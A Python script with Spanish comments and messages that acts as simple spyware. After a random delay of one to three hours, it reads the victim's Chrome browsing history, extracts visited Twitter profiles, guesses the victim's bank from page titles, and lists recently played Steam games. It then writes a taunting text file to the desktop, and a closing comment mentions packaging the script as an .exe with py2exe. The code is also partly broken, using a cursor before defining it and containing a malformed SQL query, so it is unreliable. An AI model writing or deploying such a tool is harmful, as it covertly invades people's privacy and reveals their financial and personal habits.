import os, random
from pathlib import Path
from time import sleep
from random import randrange
import sqlite3
import re
import glob
HACKERFILE_NAME = 'para_ti.txt'

def wait_delayed_action():
    n_hours = randrange(1,4)
    print("Durmiendo {} horas".format(n_hours))
    sleep(n_hours * 60 * 60)

def get_chrome_history(user_path):
    urls = None
    while not urls:    
        try:    
            history_path = user_path + "/AppData/Local/Google/Chrome/User_Data/Default/History"
            connection = sqlite3.connect(history_path)
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY title last_visit_time DESC")
            cursor = connection.cursor()
            urls = cursor.fetchall()
            print(urls)
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Couldn't connect to database, retrying...")
            sleep(3)

def create_file(user_path):
    hacker_file = open(user_path + "Desktop/Para ti.txt", "a")
    hacker_file.write("te amo bro, ten un lindo dia, no paso nada raro")
    return hacker_file

def get_user_path():
    return "{}/".format(Path.home())

def check_twitter_profiles(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history:
        print(item[2])
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$",item[2])
        if results and results[0] not in ["notifications", "home"]:
            profiles_visited.append(results[0])
    hacker_file.write("parece que anduviste por aca: {}".format(", ".join(profiles_visited)))

def check_bank_account(hacker_file, chrome_history):
    banks = ["BBVA", "Santander", "CitiBanamex"]
    his_bank = None
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        
        if his_bank:
            break
    print(his_bank)
    hacker_file.write("Parece que guardas los millones en {}".format(his_bank))

def check_steam_games(hacker_file):
    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
    games = []
    game_paths = glob.glob(steam_path)
    game_paths.sort(key = os.path.getmtime, reverse = True)
    for game_path in game_paths:
        games.append(game_path.split("\\")[-1])
    hacker_file.write("parece que juegas mucho con tu pito y a {} ".format(", ".join(games[:3])))

def main():
    # wait between 1 and 3 hours
    wait_delayed_action()
    # calculate user path file 
    user_path = get_user_path()
    # catch chrome's history
    chrome_history = get_chrome_history(user_path)
    print(chrome_history)
    # creating the file on desktop
    hacker_file = create_file(user_path)
    # checking twitter pro
    check_twitter_profiles(hacker_file, chrome_history)
    # checking bank account pages
    check_bank_account(hacker_file, chrome_history)
    # checking steam games installed
    check_steam_games(hacker_file)

if __name__ == '__main__':
    main()
    '''
        instalar el py2exe en la  perrona
        pip install py2exe
    '''